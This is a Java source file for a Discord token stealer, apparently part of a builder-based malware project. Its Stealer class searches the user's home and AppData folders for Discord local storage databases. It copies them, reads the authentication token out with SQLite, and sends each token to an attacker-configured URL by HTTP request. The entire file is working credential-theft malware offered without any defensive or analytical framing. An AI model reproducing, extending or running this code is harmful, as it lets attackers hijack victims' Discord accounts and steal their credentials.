package de.romjaki.tokenstealer.stealer;

import de.romjaki.tokenstealer.builder.Config;

import java.io.File;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.*;
import java.nio.file.attribute.BasicFileAttributes;
import java.sql.*;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Objects;
import java.util.stream.Stream;

public class Stealer {
    private static final String UNIX_LOCALSTORAGE = "glob:" + System.getenv("HOME") + "/.config/discord*/Local Storage/*discordapp*_0.localstorage";
    private static final String WINDOWS_LOCALSTORAGE = "glob:" + System.getenv("APPDATA") + "/discord*/Local Storage/*discordapp*_0.localstorage";

    public static void steal() {
        try {
            Class.forName("org.sqlite.JDBC");
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
            return;
        }
        getDiscordLocations()
                .stream()
                .peek(System.out::println)
                .map(Stealer::copy)
                .map(Path::toFile)
                .map(Stealer::sqliteConnect)
                .flatMap(Stealer::getToken)
                .forEach(Stealer::sendToken);
    }

    private static Path copy(Path from) {
        try {
            Path to = Files.createTempFile(from.getParent(), "backup-", ".localstorage");
            Files.copy(from, to, StandardCopyOption.REPLACE_EXISTING);
            return to;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return from;
    }

    private static Connection sqliteConnect(File file) {
        try {
            return DriverManager.getConnection("jdbc:sqlite:" + file.getCanonicalPath());
        } catch (SQLException | IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    private static void sendToken(String token) {
        System.out.println("Found token: " + token);
        try {
            HttpURLConnection conn = (HttpURLConnection)
                    new URL(String.format(Config.INSTANCE.getRequest(), token))
                            .openConnection();
            conn.setRequestMethod("GET");
            conn.getInputStream().read();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static Stream<String> getToken(Connection connection) {
        try {
            Statement stmt = connection.createStatement();
            ResultSet result = stmt.executeQuery("SELECT key, value FROM ItemTable WHERE key='token'");
            Stream.Builder<String> builder = Stream.builder();
            while (result.next()) {
                byte[] blob = result.getBytes("value");
                byte[] buffer = new byte[blob.length / 2];
                int i = -1;
                while (++i < buffer.length)
                    buffer[i] = blob[i * 2];
                builder.add(new String(buffer).replace("\"", ""));
            }
            return builder.build();
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return Stream.of();
    }


    private static List<Path> getDiscordLocations() {
        List<Path> matches = new ArrayList<>();
        matches.addAll(getUnixDiscordLocations());
        matches.addAll(getWindowsDiscordLocations());
        return matches;
    }

    private static List<Path> globRecurse(String glob, String start) {
        try {
            return globRecurse(glob, Paths.get(start));
        } catch (Exception e) {
            return Collections.emptyList();
        }
    }

    private static List<Path> globRecurse(String glob, Path path) {
        List<Path> matches = new ArrayList<>();
        try {
            PathMatcher unixMatcher = FileSystems.getDefault()
                    .getPathMatcher(glob);
            Files.walkFileTree(path, new SimpleFileVisitor<Path>() {
                @Override
                public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                    System.out.print(file);
                    if (unixMatcher.matches(file)) {
                        System.out.println("[FOUND]");
                        matches.add(file);
                    } else {
                        System.out.println("[NOT FOUND]");
                    }
                    return FileVisitResult.CONTINUE;
                }

                @Override
                public FileVisitResult visitFileFailed(Path file, IOException exc) {
                    return FileVisitResult.CONTINUE;
                }
            });
        } catch (Exception e) {
            e.printStackTrace();
        }
        return matches;
    }

    private static List<Path> getWindowsDiscordLocations() {

        return globRecurse(WINDOWS_LOCALSTORAGE.replace("\\", "/"),
                System.getenv("APPDATA").replace("\\", "/"));
    }

    private static List<Path> getUnixDiscordLocations() {
        return globRecurse(UNIX_LOCALSTORAGE, System.getenv("HOME") + "/.config");
    }
}
